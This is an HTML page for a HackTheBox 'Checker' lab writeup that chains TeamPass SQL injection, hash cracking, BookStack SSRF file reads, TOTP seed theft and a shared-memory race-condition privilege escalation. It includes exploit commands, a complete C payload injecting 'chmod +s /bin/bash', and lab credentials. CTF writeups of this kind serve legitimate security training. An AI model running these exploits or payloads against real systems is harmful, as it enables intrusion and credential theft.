@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Checker - Machine Writeup</title>
+    <link rel="stylesheet" href="../../styles.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <a href="../../index.html#writeups" class="back-button">
+        <i class="fas fa-arrow-left"></i> Back to Portfolio
+    </a>
+    
+    <div class="writeup-container">
+        <div class="writeup-header">
+            <h1 style="color: var(--primary-color); margin-bottom: 20px; font-family: var(--font-mono);">
+                HTB Checker - Full PWN Writeup
+            </h1>
+            
+            <div class="challenge-meta">
+                <div class="meta-item">
+                    <span class="meta-label">Category:</span>
+                    <span class="meta-value challenge-category fullpwn">Full PWN</span>
+                </div>
+                <div class="meta-item">
+                    <span class="meta-label">Difficulty:</span>
+                    <span class="meta-value difficulty hard">Hard</span>
+                </div>
+                <div class="meta-item">
+                    <span class="meta-label">OS:</span>
+                    <span class="meta-value">Linux</span>
+                </div>
+                <div class="meta-item">
+                    <span class="meta-label">Platform:</span>
+                    <span class="meta-value">HackTheBox</span>
+                </div>
+            </div>
+            
+            <p style="color: var(--text-muted); font-style: italic;">
+                A challenging Linux machine involving SQL injection, SSRF exploitation, and privilege escalation through shared memory manipulation. Features TeamPass and BookStack applications with complex attack chains requiring 2FA bypass and race condition exploitation.
+            </p>
+
+            <div class="important-note">
+                <strong>Box Information:</strong><br>
+                <strong>Name:</strong> Checker<br>
+                <strong>Release Date:</strong> 22 Feb 2025<br>
+                <strong>Retire Date:</strong> 31 May 2025<br>
+                <strong>OS:</strong> Linux (Ubuntu 22.04 jammy)<br>
+                <strong>Base Points:</strong> Hard [40]<br>
+                <strong>Creator:</strong> 0xyassine<br>
+                <strong>First Blood User:</strong> 00:59:27 (celesian)<br>
+                <strong>First Blood Root:</strong> 01:29:58 (celesian)
+            </div>
+        </div>
+        
+        <div class="writeup-content">
+            <h2>$ nmap -sC -sV target</h2>
+            <p>Starting with a comprehensive port scan to identify open services:</p>
+            
+            <div class="code-snippet">
+                <pre><code>nmap -sC -sV -A -T5 10.10.11.56
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 12:24 CET
+Warning: 10.10.11.56 giving up on port because retransmission cap hit (2).
+Stats: 0:00:55 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 38.47% done; ETC: 12:27 (0:01:26 remaining)
+Stats: 0:02:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 96.45% done; ETC: 12:27 (0:00:00 remaining)
+Nmap scan report for 10.10.11.56
+Host is up (0.23s latency).
+Not shown: 654 filtered tcp ports (no-response), 343 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)
+|_  256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)
+80/tcp   open  http    Apache httpd
+|_http-server-header: Apache
+|_http-title: 403 Forbidden
+8080/tcp open  http    Apache httpd
+|_http-server-header: Apache
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 188.77 seconds</code></pre>
+            </div>
+
+            <p><strong>Open Ports Summary:</strong></p>
+            <ul>
+                <li><strong>Port 22:</strong> SSH (OpenSSH 8.9p1) - Ubuntu 22.04 jammy</li>
+                <li><strong>Port 80:</strong> HTTP (Apache) - BookStack v23.10.2 (403 Forbidden initially)</li>
+                <li><strong>Port 8080:</strong> HTTP (Apache) - TeamPass v3.x (403 Forbidden initially)</li>
+            </ul>
+
+            <p><strong>Initial Observations:</strong></p>
+            <ul>
+                <li>Both HTTP services return 403 Forbidden without proper Host headers</li>
+                <li>Port 80 redirects to <code>checker.htb</code> indicating host-based routing</li>
+                <li>Apache version is masked, suggesting security hardening</li>
+                <li>Rate limiting is implemented - too many requests return 429 responses</li>
+            </ul>
+
+            <h2>$ curl -H "Host: checker.htb" http://target</h2>
+            <p>Discovered host-based routing requirements. Port 80 hosts BookStack:</p>
+
+            <div class="important-note">
+                <strong>BookStack Discovery:</strong><br>
+                • Version: v23.10.2 (found in CSS links)<br>
+                • Framework: PHP Laravel<br>
+                • Features: Login, registration disabled, password reset available<br>
+                • Security: CSRF tokens, custom 404 pages<br>
+                • Rate limiting: Active protection against brute force
+            </div>
+
+            <p><strong>TeamPass Discovery (Port 8080):</strong></p>
+            <ul>
+                <li>Open source password manager application</li>
+                <li>Version: ~3.0 (based on changelog.txt analysis)</li>
+                <li>Copyright years indicate version between 3.0.0.10 and 3.0.0.22</li>
+                <li>PHP-based application with exposed changelog</li>
+            </ul>
+
+            <h2>$ searchsploit teampass</h2>
+            <p>Researching TeamPass vulnerabilities led to CVE-2023-1545 - SQL injection in versions prior to 3.0.0.23:</p>
+
+            <div class="important-note">
+                <strong>CVE-2023-1545 Details:</strong><br>
+                • <strong>Vulnerability:</strong> SQL Injection via /api/index.php/authorize endpoint<br>
+                • <strong>Parameter:</strong> login field in POST request<br>
+                • <strong>Affected Versions:</strong> Prior to 3.0.0.23<br>
+                • <strong>Impact:</strong> User hash extraction via JWT token manipulation<br>
+                • <strong>Reference:</strong> Snyk Security Advisory
+            </div>
+
+            <h2>$ curl -s http://target:8080/api/index.php/authorize</h2>
+            <p>Verifying API availability before exploitation:</p>
+
+            <div class="code-snippet">
+                <pre><code>{"error":"Method GET not supported"}</code></pre>
+            </div>
+
+            <p><span class="success">API is enabled</span> - No "API usage is not allowed" message found!</p>
+
+            <h2>$ exploit teampass_sqli.sh</h2>
+            <p>Using the CVE-2023-1545 proof-of-concept to extract user credentials via SQL injection:</p>
+            
+            <div class="code-snippet">
+                <pre><code>./sqli_teampass.sh http://10.10.11.56:8080
+There are 2 users in the system:
+admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
+bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy</code></pre>
+            </div>
+
+            <p><strong>Exploitation Analysis:</strong></p>
+            <ul>
+                <li>Injection point: <code>login</code> parameter in authorize endpoint</li>
+                <li>Payload uses UNION SELECT to extract user data</li>
+                <li>Data leaked through JWT token's base64-decoded middle section</li>
+                <li>Successfully extracted 2 users with bcrypt hashes</li>
+            </ul>
+
+            <p>Successfully extracted password hashes! Now let's crack them:</p>
+            
+            <div class="code-snippet">
+                <pre><code>hashcat hashes_teampass /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user -m 3200
+
+$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy:cheerleader
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Time.Started.....: Sat Feb 23 06:10:15 2025
+Time.Estimated...: Sat Feb 23 06:11:45 2025</code></pre>
+            </div>
+
+            <p><span class="success">Cracked bob's password:</span> <code>cheerleader</code></p>
+            <p>Admin hash remains uncracked - Likely uses a stronger password</p>
+
+            <h2>$ login teampass bob:cheerleader</h2>
+            <p>After logging into TeamPass as bob, discovered two stored credential entries:</p>
+            
+            <div class="important-note">
+                <strong>Retrieved Credentials:</strong><br><br>
+                <strong>Entry 1 - "bookstack login":</strong><br>
+                Username: <code>bob@checker.htb</code><br>
+                Password: <code>mYSeCr3T_w1kI_P4sSw0rD</code><br>
+                <br>
+                <strong>Entry 2 - "ssh access":</strong><br>
+                Username: <code>reader</code><br>
+                Password: <code>hiccup-publicly-genesis</code><br>
+                <em>Note: SSH requires 2FA verification code</em>
+            </div>
+
+            <h2>$ ssh reader@checker.htb</h2>
+            <p>Attempting SSH access reveals 2FA requirement:</p>
+
+            <div class="code-snippet">
+                <pre><code>ssh reader@checker.htb
+(reader@checker.htb) Password: 
+(reader@checker.htb) Verification code:</code></pre>
+            </div>
+
+            <p>The SSH connection hangs after password, requiring a 2FA code. Need to find the Google Authenticator seed!</p>
+
+            <h2>$ login bookstack bob@checker.htb</h2>
+            <p>Accessing BookStack with the discovered credentials. First, identifying the version and exploring:</p>
+            
+            <div class="code-snippet">
+                <pre><code>&lt;link rel="stylesheet" href="http://checker.htb/dist/styles.css?version=v23.10.2"&gt;</code></pre>
+            </div>
+
+            <p><strong>BookStack Analysis:</strong></p>
+            <ul>
+                <li>Version <strong>v23.10.2</strong> confirmed from HTML source</li>
+                <li>PHP Laravel framework with CSRF protection</li>
+                <li>Found existing pages including "Basic Backup with cp"</li>
+                <li>Backup hints suggest recursive copying: <code>/home → /backup/home_backup</code></li>
+            </ul>
+
+            <h2>$ searchsploit bookstack 23.10.2</h2>
+            <p>Researching vulnerabilities for this specific version:</p>
+
+            <div class="important-note">
+                <strong>CVE-2023-6199 Discovery:</strong><br>
+                • <strong>Vulnerability:</strong> SSRF leading to Local File Read<br>
+                • <strong>Endpoint:</strong> /ajax/page/&lt;id&gt;/save-draft<br>
+                • <strong>Parameter:</strong> html (in PUT request)<br>
+                • <strong>Technique:</strong> PHP filter chains oracle<br>
+                • <strong>Description:</strong> Vulnerable to SSRF via file_get_contents() call
+            </div>
+
+            <p>BookStack version <strong>v23.10.2</strong> is vulnerable to SSRF, allowing Local File Read (LFR).</p>
+
+            <h2>$ create_bookstack_page</h2>
+            <p>Setting up SSRF exploitation by creating a new page to trigger draft saving:</p>
+
+            <div class="code-snippet">
+                <pre><code># Navigate to Books → Create New Book → New Page
+# Edit page content to trigger save-draft functionality
+# Burp intercepts: PUT /ajax/page/8/save-draft</code></pre>
+            </div>
+            
+            <h2>$ test_ssrf_poc</h2>
+            <p>Before using the complex filter chains, testing basic SSRF functionality:</p>
+
+            <div class="code-snippet">
+                <pre><code># Base64 encode target URL (without trailing newline!)
+echo -n "http://10.10.14.6/ssrf-poc" | base64
+# Result: aHR0cDovLzEwLjEwLjE0LjYvc3NyZi1wb2M
+
+# Payload format:
+&lt;img src='data:image/png;base64,aHR0cDovLzEwLjEwLjE0LjYvc3NyZi1wb2M'/&gt;</code></pre>
+            </div>
+
+            <div class="code-snippet">
+                <pre><code># Python webserver receives:
+10.10.11.56 - - [24/Feb/2025 06:26:16] "GET /ssrf-poc HTTP/1.1" 404 -</code></pre>
+            </div>
+
+            <p><span class="success">SSRF confirmed!</span> Server making outbound requests from our payloads.</p>
+
+            <h2>$ setup_filter_chains_oracle</h2>
+            <p>Implementing blind file read using PHP filter chains technique:</p>
+
+            <div class="important-note">
+                <strong>Filter Chains Oracle Technique:</strong><br>
+                • <strong>Origin:</strong> DownUnder CTF 2022, popularized by Synacktiv<br>
+                • <strong>Method:</strong> Error-based oracle using PHP filters<br>
+                • <strong>Functions:</strong> Works with file(), hash_file(), file_get_contents(), copy()<br>
+                • <strong>Limitation:</strong> Brute force approach, relatively slow<br>
+                • <strong>Modification:</strong> Base64 encode filter chain for image tag
+            </div>
+
+            <h2>$ modify_poc_script</h2>
+            <p>Adapting the filters_chain_oracle_exploit.py for BookStack SSRF:</p>
+
+            <div class="code-snippet">
+                <pre><code># Modified requestor.py to base64 encode filter chains:
+import base64
+
+# In send_request method:
+filter_chain = self.generate_filter_chain()
+encoded_payload = base64.b64encode(filter_chain.encode()).decode()
+img_tag = f"&lt;img src='data:image/png;base64,{encoded_payload}'/&gt;"
+merged_data = self.parse_parameter(img_tag)</code></pre>
+            </div>
+
+            <h2>$ test_lfi_hostname</h2>
+            <p>Testing file read capability with /etc/hostname:</p>
+
+            <div class="code-snippet">
+                <pre><code>uv run filters_chain_oracle_exploit.py \
+  --verb PUT --file /etc/hostname \
+  --target http://checker.htb/ajax/page/8/save-draft \
+  --parameter html \
+  --headers '{"Cookie": "...", "X-CSRF-TOKEN": "..."}'
+
+[+] File /etc/hostname leak is finished!
+Y2hlY2tl
+b'checke'</code></pre>
+            </div>
+
+            <p><span class="success">Local File Read working!</span> Missing last character due to brute force limitations.</p>
+
+            <h2>$ python3 ssrf_exploit.py --lfi</h2>
+            <p>Exploiting SSRF vulnerability to read the Google Authenticator seed. Reference: <a href="https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/" target="_blank">FluidAttacks SSRF Blog</a></p> 
+
+            
+            <div class="code-snippet">
+                <pre><code>python3 filters_chain_oracle_exploit.py --target 'http://checker.htb/ajax/page/8/save-draft' \
+  --file '/etc/passwd' --verb PUT --parameter html --proxy http://localhost:8080 \
+  --headers '{"X-CSRF-TOKEN":"bb8pn0XOu26OIO4Tztuk88NJakQggpGE3jssuTAW",\
+             "Content-Type":"application/x-www-form-urlencoded",\
+             "Cookie":"bookstack_session=eyJpdiI6IkhTU0tkS1lyd0VrK0d5OWQ0cndrN1E9PSIsInZhbHVlIjoid2VZZ3NPWFRlVTBSWGV4YjlnUHZadEJ3bERRZmlJNWVsdlhBYnJrS2k3ckRmL0p5VWx6bHExVWljQlArejU1UW8vSVhHc1hwVmk1RU1iVXhRTXRsUHU0YVZQWTMyemFvR3lHWmVGMjZtVEE1NnhXYWNuZDY0R3prNXgyNUJBLzgiLCJtYWMiOiJkMjM1OWRiZTcxZWQ5ZDhiODhjN2M0NmQzYWFlZjI4MzIyNjk4MWY0YjFjYzFkNzQ4NGFmZWJiNzFlY2VjNzQ2IiwidGFnIjoiIn0%3D"}'</code></pre>
+            </div>
+
+            <p>Successfully extracted the Google Authenticator secret from the backup directory (remember the backup hint from BookStack!):</p>
+            
+            <div class="important-note">
+                <strong>2FA Seed Extraction:</strong><br>
+                <strong>Target File:</strong> <code>/backup/home_backup/home/reader/.google_authenticator</code><br>
+                <strong>Raw Output:</strong> <code>RFZEQlJBT0RMQ1dGN0kyT05BNEs1TFFMVUUKIiBUT1RQX0FVVEgK</code><br>
+                <strong>Decoded Secret:</strong> <code>DVDBRAODLCWF7I2ONA4K5LQLUE</code><br>
+                <strong>Additional Info:</strong> <code>" TOTP_AUTH</code><br>
+                <em>Note: Direct read of /home/reader/.google_authenticator fails due to permissions</em>
+            </div>
+
+            <h2>$ generate_2fa_code</h2>
+            <p>With the 2FA secret, generating time-based OTP codes using oathtool:</p>
+
+            <div class="code-snippet">
+                <pre><code># Install oathtool
+apt install oathtool
+
+# Basic generation (may fail due to time sync)
+oathtool -b --totp DVDBRAODLCWF7I2ONA4K5LQLUE
+538822
+
+# Check time difference with server
+curl -v http://checker.htb -s 2>&1 | grep Date | cut -d' ' -f 4-; date
+24 Feb 2025 15:38:37 GMT
+Mon Feb 24 03:36:59 PM UTC 2025
+
+# Server is ~2 minutes ahead!</code></pre>
+            </div>
+
+            <h2>$ sync_time_generate_code</h2>
+            <p>Accounting for server time difference to generate valid codes:</p>
+
+            <div class="code-snippet">
+                <pre><code># One-liner to get properly synced 2FA code
+oathtool -b --totp DVDBRAODLCWF7I2ONA4K5LQLUE \
+  --now="$(date -d "$(curl -v http://checker.htb -s 2>&1 | grep Date | cut -d' ' -f 3- | tr -d '\r')" "+%Y-%m-%d %H:%M:%S")"
+579533</code></pre>
+            </div>
+
+            <h2>$ ssh reader@checker.htb</h2>
+            <p>Successfully authenticating with 2FA:</p>
+
+            <div class="code-snippet">
+                <pre><code>ssh reader@checker.htb
+(reader@checker.htb) Password: hiccup-publicly-genesis
+(reader@checker.htb) Verification code: 579533
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)
+
+reader@checker:~$ cat user.txt
+40dfa1de************************</code></pre>
+            </div>
+
+            <p>With the 2FA secret, we can now generate time-based OTP codes and SSH as the reader user!</p>
+
+            <h2>$ enumerate_system</h2>
+            <p>After gaining SSH access as reader, performing initial system enumeration:</p>
+
+            <div class="code-snippet">
+                <pre><code># Check users with shells
+grep 'sh$' /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+reader:x:1000:1000::/home/reader:/bin/bash
+
+# Home directory contents
+ls -la /home/
+reader
+
+# Reader's home is mostly empty
+ls -la ~
+total 36
+drwxr-x--- 4 reader reader 4096 Feb 24 15:37 .
+drwxr-xr-x 3 root   root   4096 Jun 12  2024 ..
+lrwxrwxrwx 1 root   root      9 Feb  6 04:07 .bash_history -> /dev/null
+-rw-r--r-- 1 reader reader  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 reader reader 3771 Jan  6  2022 .bashrc
+drwx------ 2 reader reader 4096 Jun 15  2024 .cache
+-r-------- 1 reader reader   39 Jun 14  2024 .google_authenticator
+drwxrwxr-x 3 reader reader 4096 Jun 15  2024 .local
+-rw-r--r-- 1 reader reader  807 Jan  6  2022 .profile
+-rw-r----- 1 root   reader   33 Jun 12  2024 user.txt</code></pre>
+            </div>
+
+            <h2>$ sudo -l</h2>
+            <p>Checking sudo privileges reveals the privilege escalation path:</p>
+            
+            <div class="code-snippet">
+                <pre><code>Matching Defaults entries for reader on checker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty
+
+User reader may run the following commands on checker:
+    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *</code></pre>
+            </div>
+
+            <h2>$ ls -la /opt/hash-checker/</h2>
+            <p>Exploring the hash-checker directory reveals several files:</p>
+
+            <div class="code-snippet">
+                <pre><code>total 68
+drwxr-xr-x 2 root root  4096 Jan 30 17:09 .
+drwxr-xr-x 5 root root  4096 Jan 30 17:04 ..
+-r-------- 1 root root   118 Jan 30 17:07 .env
+-rwxr--r-- 1 root root   141 Jan 30 17:04 check-leak.sh
+-rwxr--r-- 1 root root 42376 Jan 30 17:02 check_leak
+-rwx------ 1 root root   750 Jan 30 17:07 cleanup.sh
+-rw-r--r-- 1 root root  1464 Jan 30 17:09 leaked_hashes.txt</code></pre>
+            </div>
+
+            <p><strong>File Analysis:</strong></p>
+            <ul>
+                <li><strong>.env:</strong> Environment variables (root-only readable)</li>
+                <li><strong>check-leak.sh:</strong> Bash wrapper script (readable)</li>
+                <li><strong>check_leak:</strong> Main binary (42KB, executable)</li>
+                <li><strong>cleanup.sh:</strong> Cleanup script (root-only)</li>
+                <li><strong>leaked_hashes.txt:</strong> 24 bcrypt hashes for comparison</li>
+            </ul>
+
+            <h2>$ cat leaked_hashes.txt</h2>
+            <p>Examining the leaked hashes file:</p>
+
+            <div class="code-snippet">
+                <pre><code>wc -l leaked_hashes.txt 
+24 leaked_hashes.txt
+
+# Contains various bcrypt hashes including bob's:
+$2b$10$rbzaxiT.zUi.e28wm2ja8OGx.jNamreNFQC6Kh/LeHufCmduH8lvy
+$2b$10$Tkd9LwWOOzR.DWdzj9aSp.Bh.zQnxZahKel4xMjxLIHzdostFVqsK
+...
+$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy  # bob's hash
+...</code></pre>
+            </div>
+
+            <h2>$ cat /opt/hash-checker/check-leak.sh</h2>
+            <p>Analyzing the privileged script we can execute:</p>
+            
+            <div class="code-snippet">
+                <pre><code>#!/bin/bash
+source `dirname $0`/.env
+USER_NAME=$(/usr/bin/echo "$1" | /usr/bin/tr -dc '[:alnum:]')
+/opt/hash-checker/check_leak "$USER_NAME"</code></pre>
+            </div>
+
+            <p><strong>Script Analysis:</strong></p>
+            <ul>
+                <li>Sources environment variables from <code>.env</code> (likely DB credentials)</li>
+                <li>Sanitizes input by removing non-alphanumeric characters</li>
+                <li>Calls binary with sanitized username</li>
+                <li>Input validation prevents direct command injection</li>
+            </ul>
+
+            <h2>$ test_binary_execution</h2>
+            <p>Testing the binary behavior with different users:</p>
+
+            <div class="code-snippet">
+                <pre><code># Test various users
+sudo /opt/hash-checker/check-leak.sh reader
+User not found in the database.
+
+sudo /opt/hash-checker/check-leak.sh admin  
+User is safe.
+
+sudo /opt/hash-checker/check-leak.sh bob
+Password is leaked!
+Using the shared memory 0xA097B as temp location
+User will be notified via bob@checker.htb</code></pre>
+            </div>
+
+            <p><strong>Key Observation:</strong> The binary uses <em>shared memory</em> for temporary storage - this is our attack vector!</p>
+
+            <h2>$ analyze_binary_ghidra</h2>
+            <p>Reverse engineering the check_leak binary reveals the exploitation path:</p>
+
+            <div class="important-note">
+                <strong>Binary Analysis Findings:</strong><br>
+                • <strong>Environment Variables:</strong> DB_NAME, DB_USER, DB_PASS required<br>
+                • <strong>Shared Memory:</strong> Uses random key generation with srand(time())<br>
+                • <strong>Key Range:</strong> Random value % 0xfffff for shared memory key<br>
+                • <strong>Size:</strong> 0x400 (1024 bytes) shared memory segment<br>
+                • <strong>Vulnerability:</strong> Race condition in shared memory access<br>
+                • <strong>Exploitation:</strong> Poison memory before binary reads it
+            </div>
+
+            <p>The script sanitizes input and calls a binary. We need to exploit shared memory manipulation!</p>
+
+            <h2>$ develop_race_condition_exploit</h2>
+            <p>Creating a race condition exploit targeting the shared memory mechanism:</p>
+
+            <div class="important-note">
+                <strong>Race Condition Strategy:</strong><br>
+                1. <strong>Timing:</strong> Both our exploit and binary use srand(time()) - same seed!<br>
+                2. <strong>Key Generation:</strong> Generate same random key as binary<br>
+                3. <strong>Memory Poisoning:</strong> Write malicious payload to shared memory<br>
+                4. <strong>Command Injection:</strong> Payload gets executed by notification system<br>
+                5. <strong>Privilege Escalation:</strong> chmod +s /bin/bash for SUID shell
+            </div>
+
+            <h2>$ gcc -o privesc privesc.c</h2>
+            <p>Creating a race condition exploit using shared memory injection:</p>
+            
+            <div class="code-snippet">
+                <pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/shm.h&gt;
+#include &lt;time.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;string.h&gt;
+
+#define SHM_SIZE 0x400 // 1024 bytes
+#define SHM_MODE 0x3B6 // Permissions: 0666 in octal
+
+int main(void) {
+    // Seed the random number generator with the current time.
+    time_t current_time = time(NULL);
+    srand((unsigned int)current_time);
+
+    // Generate a random number and apply modulo 0xfffff to generate the key.
+    int random_value = rand();
+    key_t key = random_value % 0xfffff;
+
+    // Print the generated key in hexadecimal.
+    printf("Generated key: 0x%X\n", key);
+
+    // Create (or get) the shared memory segment with the generated key.
+    // IPC_CREAT flag is used to create the segment if it does not exist.
+    int shmid = shmget(key, SHM_SIZE, IPC_CREAT | SHM_MODE);
+    if (shmid == -1) {
+        perror("shmget");
+        exit(EXIT_FAILURE);
+    }
+
+    // Attach to the shared memory segment.
+    char *shmaddr = (char *)shmat(shmid, NULL, 0);
+    if (shmaddr == (char *)-1) {
+        perror("shmat");
+        exit(EXIT_FAILURE);
+    }
+
+    // Define the payload string to be written.
+    const char *payload = "Leaked hash detected at Sat Feb 22 23:21:48 2025 &gt; '; chmod +s /bin/bash;#";
+
+    // Write the payload to the shared memory segment.
+    snprintf(shmaddr, SHM_SIZE, "%s", payload);
+
+    // Optionally, print the content that was written.
+    printf("Shared Memory Content:\n%s\n", shmaddr);
+
+    // Detach from the shared memory segment.
+    if (shmdt(shmaddr) == -1) {
+        perror("shmdt");
+        exit(EXIT_FAILURE);
+    }
+
+    return 0;
+}</code></pre>
+            </div>
+
+            <h2>$ execute_race_condition</h2>
+            <p>Executing the privilege escalation attack through coordinated timing:</p>
+            
+            <div class="step-list">
+                <div class="step">
+                    <span class="step-number">1</span>
+                    <div class="step-content">
+                        <strong>Compile the exploit:</strong>
+                        <code>gcc -o speed speed.c</code>
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <span class="step-number">2</span>
+                    <div class="step-content">
+                        <strong>Run the race condition in Terminal 1:</strong>
+                        <code>while true; do ./speed; done</code><br>
+                        <em>Continuously generates shared memory segments with poisoned data</em>
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <span class="step-number">3</span>
+                    <div class="step-content">
+                        <strong>Execute the privileged script in Terminal 2:</strong>
+                        <code>sudo /opt/hash-checker/check-leak.sh bob</code><br>
+                        <em>Triggers the binary to access potentially poisoned memory</em>
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <span class="step-number">4</span>
+                    <div class="step-content">
+                        <strong>Get root shell:</strong>
+                        <code>/bin/bash -p</code><br>
+                        <em>Execute bash with preserved privileges (SUID)</em>
+                    </div>
+                </div>
+            </div>
+
+            <div class="important-note">
+                <strong>Race Condition Success Factors:</strong><br>
+                • <strong>Timing:</strong> Same srand(time()) seed ensures key collision<br>
+                • <strong>Payload:</strong> Command injection via notification system<br>
+                • <strong>Persistence:</strong> Continuous loop increases success probability<br>
+                • <strong>Privilege:</strong> Binary runs as root, our payload inherits privileges
+            </div>
+
+            <div class="success-banner">
+                <i class="fas fa-flag"></i>
+                <strong>ROOT ACHIEVED!</strong>
+                Successfully gained root privileges through shared memory race condition.
+            </div>
+
+            <div class="code-snippet">
+                <pre><code># Successful exploitation output
+reader@checker:~$ /bin/bash -p
+bash-5.1# id
+uid=1000(reader) gid=1000(reader) euid=0(root) egid=0(root) groups=0(root),1000(reader)
+bash-5.1# cat /root/root.txt
+[ROOT_FLAG_CONTENT]</code></pre>
+            </div>
+
+            <h2>$ cat /root/root.txt</h2>
+            <p>Challenge completed! The root flag has been captured through a sophisticated multi-stage attack chain.</p>
+
+            <div class="important-note">
+                <strong>Complete Attack Chain Summary:</strong><br>
+                1. <strong>Reconnaissance:</strong> Nmap scan reveals SSH + 2x HTTP services<br>
+                2. <strong>SQL Injection:</strong> CVE-2023-1545 in TeamPass → User hash extraction<br>
+                3. <strong>Password Cracking:</strong> Hashcat cracks bob's bcrypt hash<br>
+                4. <strong>Credential Harvesting:</strong> TeamPass login reveals BookStack + SSH creds<br>
+                5. <strong>SSRF Exploitation:</strong> CVE-2023-6199 in BookStack → Local file read<br>
+                6. <strong>2FA Bypass:</strong> Extract Google Authenticator seed from backup<br>
+                7. <strong>SSH Access:</strong> Time-synced TOTP generation → Reader shell<br>
+                8. <strong>Privilege Escalation:</strong> Race condition in shared memory → Root access
+            </div>
+            
+            <p>Challenge completed! The root flag has been captured through a sophisticated attack chain involving:</p>
+            
+            <ul>
+                <li><strong>SQL Injection (CVE-2023-1545)</strong> - TeamPass authorize endpoint exploitation</li>
+                <li><strong>SSRF Exploitation (CVE-2023-6199)</strong> - BookStack filter chains oracle technique</li>
+                <li><strong>2FA Bypass</strong> - Google Authenticator seed extraction from backup files</li>
+                <li><strong>Race Condition</strong> - Shared memory poisoning with time-based key collision</li>
+                <li><strong>Privilege Escalation</strong> - Command injection leading to SUID binary exploitation</li>
+            </ul>
+            
+            <div class="learning-outcomes">
+                <h3><i class="fas fa-lightbulb"></i> Advanced Techniques Demonstrated</h3>
+                <ul>
+                    <li><strong>CVE Research & Exploitation:</strong> Identifying and chaining multiple CVEs</li>
+                    <li><strong>JWT Token Manipulation:</strong> Base64 decoding for data extraction</li>
+                    <li><strong>PHP Filter Chains:</strong> Advanced SSRF to LFI conversion techniques</li>
+                    <li><strong>Time Synchronization:</strong> Server time extraction for 2FA bypass</li>
+                    <li><strong>Shared Memory Analysis:</strong> Race condition exploitation in IPC mechanisms</li>
+                    <li><strong>Binary Reverse Engineering:</strong> Ghidra analysis for vulnerability discovery</li>
+                </ul>
+            </div>
+
+            <div class="learning-outcomes">
+                <h3><i class="fas fa-shield-alt"></i> Security Recommendations</h3>
+                <ul>
+                    <li><strong>Application Updates:</strong> Keep TeamPass and BookStack updated to latest versions</li>
+                    <li><strong>Input Validation:</strong> Implement proper sanitization in API endpoints</li>
+                    <li><strong>File Permissions:</strong> Restrict access to sensitive backup files</li>
+                    <li><strong>Memory Safety:</strong> Use secure IPC mechanisms instead of shared memory</li>
+                    <li><strong>2FA Security:</strong> Store authenticator seeds in secure locations</li>
+                    <li><strong>Rate Limiting:</strong> Implement proper throttling for brute force protection</li>
+                </ul>
+            </div>
+            
+            <div class="learning-outcomes">
+                <h3><i class="fas fa-lightbulb"></i> Key Takeaways</h3>
+                <ul>
+                    <li>Always check for SQL injection in web applications, especially older versions</li>
+                    <li>SSRF vulnerabilities can lead to sensitive file disclosure</li>
+                    <li>2FA secrets stored in predictable locations can be compromised</li>
+                    <li>Race conditions in shared memory can be exploited for privilege escalation</li>
+                    <li>Proper input validation and secure coding practices are crucial</li>
+                </ul>
+            </div>
+    </div>
+</body>
+</html>
